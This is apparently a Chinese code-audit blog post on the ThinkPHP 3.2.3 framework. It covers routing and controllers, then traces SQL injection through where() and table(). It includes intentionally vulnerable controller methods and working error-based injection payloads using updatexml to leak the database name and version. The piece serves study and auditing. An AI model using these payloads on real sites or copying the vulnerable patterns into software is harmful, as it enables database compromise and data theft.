<p>然后访问/index.php/home/index/test,如果输出数据库内容便说民连接成功<br><img src="/2020/05/05/ThinkPHP3.2.3/1587629874670.png" alt="1587629874670"></p>
<p>然后再在config.php里面添加一个<code>&#39;SHOW_PAGE_TRACE&#39;    =&gt;  &#39;true&#39;</code>再次刷新后右下角便会出现调试信息<br><img src="/2020/05/05/ThinkPHP3.2.3/1587630115032.png" alt="1587630115032"></p>
<h1 id="框架基础"><a href="#框架基础" class="headerlink" title="框架基础"></a>框架基础</h1><p><strong><em>URL访问</em></strong></p>
<p><code>ThinkPHP</code>采用单一入口模式访问应用，对应用的所有请求都定向到应用的入口文件，系统会从<code>URL</code>参数中解析当前请求的模块、控制器和操作，下面是一个标准的<code>URL</code>访问格式：</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">第一种访问方式</span><br><span class="line">http://localhost:/thinkphp/<span class="meta">index</span>.php/Home/<span class="meta">Index</span>/<span class="meta">index</span>　　入口文件/模块/控制器/操作(方法)</span><br><span class="line">第二种访问方式(传参数)</span><br><span class="line">http://localhost:/thinkphp/<span class="meta">index</span>.php?m=Home<span class="variable">&amp;c</span>=<span class="meta">Index</span><span class="variable">&amp;a</span>=<span class="meta">index</span>　　传三个参数</span><br></pre></td></tr></table></figure>

<p>而且访问时不需要区分大小写，无论URL是否开启大小写转换，模块名都会强制小写。</p>
<p><strong>控制器</strong></p>
<p>1.控制器的定义</p>
<p>thinkphp的控制器是一个类，而操作则是控制器类的一个公共方法下面就是一个典型的控制器类的定义：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'hello,thinkphp!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Home\IndexController</code>类就代表了Home模块下的Index控制器，而hello操作就是<code>Home\IndexController</code>类的hello（公共）方法。</p>
<p>当访问 <code>http://serverName/index.php/Home/Index/hello</code> 后会输出：</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"><span class="built_in">hello,</span>thinkphp!</span><br></pre></td></tr></table></figure>

<p><strong>简单测试</strong></p>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1587632586503.png" alt="1587632586503"></p>
<p><strong>实例化控制器</strong></p>
<p>访问控制器的实例化通常是自动完成的，系统会根据URL地址解析出访问的控制器名称自动实例化，并且调用相关的操作方法。<br>如果需要跨控制器调用的话，则可以单独实例化：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实例化Home模块的User控制器</span></span><br><span class="line">$User = <span class="keyword">new</span> \Home\Controller\UserController();</span><br><span class="line"><span class="comment">// 实例化Admin模块的Blog控制器</span></span><br><span class="line">$Blog = <span class="keyword">new</span> \Admin\Controller\BlogController();</span><br></pre></td></tr></table></figure>

<p>系统为上面的控制器实例化提供了一个快捷调用方法A，上面的代码可以简化为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 假设当前模块是Home模块</span></span><br><span class="line">$User = A(<span class="string">'User'</span>); $Blog = A(<span class="string">'Admin/Blog'</span>);</span><br></pre></td></tr></table></figure>

<p>默认情况下，A方法实例化的是默认控制器层（Controller），如果你要实例化其他的分层控制器的话，可以使用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 假设当前模块是Home模块</span></span><br><span class="line"><span class="comment">// 实例化Event控制器</span></span><br><span class="line">$User = A(<span class="string">'User'</span>,<span class="string">'Event'</span>); </span><br><span class="line">$Blog = A(<span class="string">'Admin/Blog'</span>,<span class="string">'Event'</span>);</span><br></pre></td></tr></table></figure>

<p>上面的代码等效于：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实例化Home模块的User事件控制器</span></span><br><span class="line">$User = <span class="keyword">new</span> \Home\Event\UserEvent();</span><br><span class="line"><span class="comment">// 实例化Admin模块的Blog事件控制器</span></span><br><span class="line">$Blog = <span class="keyword">new</span> \Admin\Event\BlogEvent();</span><br></pre></td></tr></table></figure>

<p>实操（跨控制器调用）：在indexcontroller()里面调用usercontroller()里面的get方法<br>先新建一个UserController.class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">  			<span class="keyword">echo</span> <span class="string">'这是UserController里面的index方法'</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再IndexController里面新建一个方法调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserindex</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$b = A(<span class="string">'User'</span>);		<span class="comment">//实例化UserController.class.php里面的UserController类</span></span><br><span class="line">	$b-&gt;index();		<span class="comment">//调用UserController类里面的index方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后访问</p>
<blockquote>
<p>thinkphp/index.php/Home/Index/getuserindex</p>
</blockquote>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1587634268134.png" alt="1587634268134"></p>
<p>除了A()方法可以调用之外，R()方法也可以调用，并且更加简单R(‘User/index’);即可</p>
<p><strong>Action参数绑定</strong></p>
<p>参数绑定是通过直接绑定URL地址中的变量作为操作方法的参数，可以简化方法的定义甚至路由的解析</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="string">'URL_PARAMS_BIND'</span>       =&gt;  <span class="keyword">true</span>, <span class="comment">// URL变量绑定到操作方法作为参数</span></span><br></pre></td></tr></table></figure>

<p>参数绑定有两种方式：按照变量名绑定和按照变量顺序绑定。</p>
<p>按变量名绑定</p>
<p>默认的参数绑定方式是按照变量名进行绑定，例如，我们给Blog控制器定义了两个操作方法read和archive方法，由于read操作需要指定一个id参数，archive方法需要指定年份（year）和月份（month）两个参数，那么我们可以如下定义：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'id='</span>.$id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">archive</span><span class="params">($year=<span class="string">'2013'</span>,$month=<span class="string">'01'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'year='</span>.$year.<span class="string">'&amp;month='</span>.$month;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>URL的访问地址分别是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://serverName/index.php/Home/Blog/read/id/5</span><br><span class="line">http://serverName/index.php/Home/Blog/archive/year/2013/month/11</span><br></pre></td></tr></table></figure>

<p><strong>控制器插件</strong></p>
<p>我们再home同级目录下创建<code>Addon\SystemInfo\Controller</code>目录，并且再创建一个info控制器</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">Addon</span>\<span class="title">SystemInfo</span>\<span class="title">Controller</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">InfoController</span> <span class="keyword">extends</span> \<span class="title">Think</span>\<span class="title">Controller</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么我们访问其inde方法的url地址为</p>
<blockquote>
<p>http: / /127.0.0.1/thinkphp/index.php/home/info/index/addon/SystemInfo</p>
</blockquote>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1587636362189.png" alt="1587636362189"></p>
<h1 id="SQL注入审计"><a href="#SQL注入审计" class="headerlink" title="SQL注入审计"></a>SQL注入审计</h1><h2 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h2><h3 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a>where注入</h3><p>以字符串的方式将条件作为where()方法的参数时就会产生SQL注入。</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$User = M(<span class="string">"User"</span>); <span class="comment">// 实例化User对象</span></span><br><span class="line">$User-&gt;where(<span class="string">'type=1 AND status=1'</span>)-&gt;select(); </span><br></pre></td></tr></table></figure>

<p>最后生成的SQL语句是</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> think_user <span class="keyword">WHERE</span> <span class="keyword">type</span>=<span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">status</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>实例：<br>再indexcontroller.class.php中添加一个sql方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'sql注入实例'</span>;</span><br><span class="line">       $a = M(<span class="string">"User"</span>)-&gt;where(<span class="string">'id='</span>.I(<span class="string">'id'</span>))-&gt;find(); </span><br><span class="line">       dump($a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当输入?id=1的时候成功查询到数据，输入单引号时报错，使用小括号和–成功闭合，此时的SQL语句为</p>
<blockquote>
<p>SELECT * FROM <code>thinkphp_user</code> WHERE ( id=1) – ) LIMIT 1</p>
</blockquote>
<p>使用报错注入爆出数据库名<img src="/2020/05/05/ThinkPHP3.2.3/1587653869748.png" alt="1587653869748"></p>
<p><strong>分析</strong><br>我们传入的id首先进入 I 方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">I</span><span class="params">($name,$default=<span class="string">''</span>,$filter=null,$datas=null)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> $_PUT	=	<span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">if</span>(strpos($name,<span class="string">'/'</span>))&#123; <span class="comment">// 指定修饰符</span></span><br><span class="line">		<span class="keyword">list</span>($name,$type) 	=	explode(<span class="string">'/'</span>,$name,<span class="number">2</span>);</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(C(<span class="string">'VAR_AUTO_STRING'</span>))&#123; <span class="comment">// 默认强制转换为字符串</span></span><br><span class="line">        $type   =   <span class="string">'s'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(strpos($name,<span class="string">'.'</span>)) &#123; <span class="comment">// 指定参数来源</span></span><br><span class="line">        <span class="keyword">list</span>($method,$name) =   explode(<span class="string">'.'</span>,$name,<span class="number">2</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 默认为自动判断</span></span><br><span class="line">        $method =   <span class="string">'param'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//code</span></span><br><span class="line">	    is_array($data) &amp;&amp; array_walk_recursive($data,<span class="string">'think_filter'</span>);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">.<span class="comment">//code</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_filter</span><span class="params">(&amp;$value)</span></span>&#123;</span><br><span class="line">	<span class="comment">// TODO 其他安全过滤</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>,$value))&#123;</span><br><span class="line">        $value .= <span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 I 方法中进行一次 htmlspecialchars 和 think_filter 的过滤处理后返回$data,之后再经过where方法处理返回<code>options[&#39;where&#39;]</code>，进入find方法，之后再find方法中又进入/ThinkPHP/Library/Think/Model.class.php调用了select方法。<strong>但是可以发现在think_filter过滤时为黑名单过滤 并且常见的updataxml()报错函数等没有过滤，所以可以进行报错注入。</strong><br><img src="/2020/05/05/ThinkPHP3.2.3/1587957048476.png" alt="1587957048476"></p>
<p>在find方法中的id还是我们传入的1b<br>继续跟进，然后进入_parseOptions函数中进行表达式分析<br><img src="/2020/05/05/ThinkPHP3.2.3/1587957545707.png" alt="1587957545707"></p>
<p>之后进入到<code>select()</code>方法中</p>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1587966558672.png" alt="1587966558672"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model = $options[<span class="string">'model'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>($options[<span class="string">'bind'</span>]) ? $options[<span class="string">'bind'</span>] : <span class="keyword">array</span>());</span><br><span class="line">        $sql    = <span class="keyword">$this</span>-&gt;buildSelectSql($options);</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;query($sql, !<span class="keyword">empty</span>($options[<span class="string">'fetch_sql'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>, !<span class="keyword">empty</span>($options[<span class="string">'master'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再进入到<code>buildSelectSql()</code>方法中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildSelectSql</span><span class="params">($options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'page'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 根据页数计算limit</span></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="keyword">$this</span>-&gt;parseSql(<span class="keyword">$this</span>-&gt;selectSql, $options);</span><br><span class="line">        <span class="keyword">return</span> $sql;<span class="comment">//SELECT * FROM `user` WHERE 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入到<code>parseSql()</code>中，该方法主要用来利于前面获取的各字段信息，拼接SQL语句。<br>在此方法中，直接取出$options[‘table’]的值作为查询语句中的table</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseSql</span><span class="params">($sql, $options = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $sql = str_replace(</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'%TABLE%'</span>, <span class="string">'%DISTINCT%'</span>, <span class="string">'%FIELD%'</span>, <span class="string">'%JOIN%'</span>, <span class="string">'%WHERE%'</span>, <span class="string">'%GROUP%'</span>, <span class="string">'%HAVING%'</span>, <span class="string">'%ORDER%'</span>, <span class="string">'%LIMIT%'</span>, <span class="string">'%UNION%'</span>, <span class="string">'%LOCK%'</span>, <span class="string">'%COMMENT%'</span>, <span class="string">'%FORCE%'</span>),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>]),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseDistinct(<span class="keyword">isset</span>($options[<span class="string">'distinct'</span>]) ? $options[<span class="string">'distinct'</span>] : <span class="keyword">false</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseField(!<span class="keyword">empty</span>($options[<span class="string">'field'</span>]) ? $options[<span class="string">'field'</span>] : <span class="string">'*'</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseJoin(!<span class="keyword">empty</span>($options[<span class="string">'join'</span>]) ? $options[<span class="string">'join'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>($options[<span class="string">'where'</span>]) ? $options[<span class="string">'where'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseGroup(!<span class="keyword">empty</span>($options[<span class="string">'group'</span>]) ? $options[<span class="string">'group'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseHaving(!<span class="keyword">empty</span>($options[<span class="string">'having'</span>]) ? $options[<span class="string">'having'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>]) ? $options[<span class="string">'order'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLimit(!<span class="keyword">empty</span>($options[<span class="string">'limit'</span>]) ? $options[<span class="string">'limit'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseUnion(!<span class="keyword">empty</span>($options[<span class="string">'union'</span>]) ? $options[<span class="string">'union'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseLock(<span class="keyword">isset</span>($options[<span class="string">'lock'</span>]) ? $options[<span class="string">'lock'</span>] : <span class="keyword">false</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseComment(!<span class="keyword">empty</span>($options[<span class="string">'comment'</span>]) ? $options[<span class="string">'comment'</span>] : <span class="string">''</span>),</span><br><span class="line">                <span class="keyword">$this</span>-&gt;parseForce(!<span class="keyword">empty</span>($options[<span class="string">'force'</span>]) ? $options[<span class="string">'force'</span>] : <span class="string">''</span>),</span><br><span class="line">            ), $sql);</span><br><span class="line">        <span class="keyword">return</span> $sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里主要查看parseWhere方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhere</span><span class="params">($where)</span> </span>&#123;</span><br><span class="line">    $whereStr = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span>(is_string($where)) &#123;</span><br><span class="line">        <span class="comment">// 直接使用字符串条件</span></span><br><span class="line">        $whereStr = $where;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 使用数组表达式</span></span><br><span class="line">        $operate  = <span class="keyword">isset</span>($where[<span class="string">'_logic'</span>])?strtoupper($where[<span class="string">'_logic'</span>]):<span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(in_array($operate,<span class="keyword">array</span>(<span class="string">'AND'</span>,<span class="string">'OR'</span>,<span class="string">'XOR'</span>)))&#123;</span><br><span class="line">            <span class="comment">// 定义逻辑运算规则 例如 OR XOR AND NOT</span></span><br><span class="line">            $operate    =   <span class="string">' '</span>.$operate.<span class="string">' '</span>;</span><br><span class="line">            <span class="keyword">unset</span>($where[<span class="string">'_logic'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 默认进行 AND 运算</span></span><br><span class="line">            $operate    =   <span class="string">' AND '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> ($where <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_numeric($key))&#123;</span><br><span class="line">                $key  = <span class="string">'_complex'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>===strpos($key,<span class="string">'_'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 解析特殊条件表达式</span></span><br><span class="line">                $whereStr   .= <span class="keyword">$this</span>-&gt;parseThinkWhere($key,$val);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">// 查询字段的安全过滤</span></span><br><span class="line">                <span class="comment">// if(!preg_match('/^[A-Z_\|\&amp;\-.a-z0-9\(\)\,]+$/',trim($key)))&#123;</span></span><br><span class="line">                <span class="comment">//     E(L('_EXPRESS_ERROR_').':'.$key);</span></span><br><span class="line">                <span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>

<p>最后跟进一下parseThinkwhere方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseThinkWhere</span><span class="params">($key,$val)</span> </span>&#123;</span><br><span class="line">    $whereStr   = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">switch</span>($key) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'_string'</span>:</span><br><span class="line">            <span class="comment">// 字符串模式查询条件</span></span><br><span class="line">            $whereStr = $val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'_complex'</span>:</span><br><span class="line">            <span class="comment">// 复合查询条件</span></span><br><span class="line">            $whereStr = substr(<span class="keyword">$this</span>-&gt;parseWhere($val),<span class="number">6</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'_query'</span>:</span><br><span class="line">            <span class="comment">// 字符串模式查询条件</span></span><br><span class="line">            parse_str($val,$where);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($where[<span class="string">'_logic'</span>])) &#123;</span><br><span class="line">                $op   =  <span class="string">' '</span>.strtoupper($where[<span class="string">'_logic'</span>]).<span class="string">' '</span>;</span><br><span class="line">                <span class="keyword">unset</span>($where[<span class="string">'_logic'</span>]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $op   =  <span class="string">' AND '</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $array   =  <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> ($where <span class="keyword">as</span> $field=&gt;$data)</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($field).<span class="string">' = '</span>.<span class="keyword">$this</span>-&gt;parseValue($data);</span><br><span class="line">            $whereStr   = implode($op,$array);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'( '</span>.$whereStr.<span class="string">' )'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$key为_string，所以$whereStr为传入的参数的值，最后parserWhere方法返回(id=1p)<br><code>parseSql()</code>中拼接时将$option[‘where’]作为了where部分，拼接后导致注入<br>返回最终的sql语句</p>
<blockquote>
<p>SELECT * FROM <code>thinkphp_user</code> WHERE ( id=1 ) LIMIT 1</p>
</blockquote>
<p>所以构造payload返回的SQL语句为</p>
<blockquote>
<p>SELECT * FROM <code>thinkphp_user</code> WHERE ( id=1) and updatexml(1,concat(0x7e,database(),0x7e),1)– ) LIMIT 1</p>
</blockquote>
<h3 id="table注入"><a href="#table注入" class="headerlink" title="table注入"></a>table注入</h3><p>table方法也属于模型类的连贯操作方法之一，主要用于指定操作的数据表。</p>
<p><strong>用法</strong></p>
<p>一般情况下，操作模型的时候系统能够自动识别当前对应的数据表，所以，使用table方法的情况通常是为了切换操作的数据表或者对多表进行操作；</p>
<p>例如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$Model-&gt;table('think_user')-&gt;where('status&gt;1')-&gt;select();</span><br></pre></td></tr></table></figure>

<p>也可以在table方法中指定数据库，例如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$Model-&gt;table('db_name.think_user')-&gt;where('status&gt;1')-&gt;select();</span><br></pre></td></tr></table></figure>

<p>table方法指定的数据表需要完整的表名，但可以采用下面的方式简化数据表前缀的传入，例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$Model-&gt;table('__USER__')-&gt;where('status&gt;1')-&gt;select();</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>会自动获取当前模型对应的数据表前缀来生成 <code>think_user</code> 数据表名称。</p>
<p><strong>实例</strong></p>
<p>再indexcontroller.class.php中添加一个sql_table方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql_table</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'sql注入实例'</span>;</span><br><span class="line">    M()-&gt;table(I(<span class="string">'tab'</span>))-&gt;where(<span class="string">'1=1'</span>)-&gt;find();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当输入一个不存在的表时显示错误</p>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1587952081549.png" alt="1587952081549"></p>
<p>当输入的表存在时返回正常，执行了</p>
<blockquote>
<ol>
<li>SHOW COLUMNS FROM <code>thinkphp_user</code> [ RunTime:0.0016s ]</li>
<li>SELECT * FROM <code>thinkphp_user</code> WHERE ( 1=1 ) LIMIT 1   [ RunTime:0.0045s ]</li>
</ol>
</blockquote>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1587952107733.png" alt="1587952107733"></p>
<p><strong>分析</strong><br>传入?tab=qwe，当我们查询一个不存在的表时，首先进入了table方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">table</span><span class="params">($table)</span> </span>&#123;</span><br><span class="line">    $prefix =   <span class="keyword">$this</span>-&gt;tablePrefix;</span><br><span class="line">    <span class="keyword">if</span>(is_array($table)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'table'</span>] =   $table;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(!<span class="keyword">empty</span>($table)) &#123;</span><br><span class="line">        <span class="comment">//将__TABLE_NAME__替换成带前缀的表名</span></span><br><span class="line">        $table  = preg_replace_callback(<span class="string">"/__([A-Z0-9_-]+)__/sU"</span>, <span class="function"><span class="keyword">function</span><span class="params">($match)</span> <span class="title">use</span><span class="params">($prefix)</span></span>&#123; <span class="keyword">return</span> $prefix.strtolower($match[<span class="number">1</span>]);&#125;, $table);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">'table'</span>] =   $table;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/05/ThinkPHP3.2.3/1587952419329.png" alt="1587952419329"></p>
<p>之后进入where方法，但由于where为1=1恒成立，所以不用管。继续F7跟进，之后将语句组合后给query去查询</p>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1587982883610.png" alt="1587982883610"></p>
<p>由于表不存在，所以查询错误，最终会进入error方法<br><img src="/2020/05/05/ThinkPHP3.2.3/1587984526886.png" alt="1587984526886"></p>
<p>当传入</p>
<blockquote>
<p>tab=thinkphp_user where 1=1 and updatexml(1,concat(0x7e,version(),0x7e),1)%23</p>
</blockquote>
<p>时，由于表存在，所以可以执行后面的语句，从而达到报错注入的目的</p>
<p><img src="/2020/05/05/ThinkPHP3.2.3/1587984645897.png" alt="1587984645897"></p>
<p> 依然是传入的payload经过I()-&gt;table()-&gt;where()方法后进入find()方法。</p>
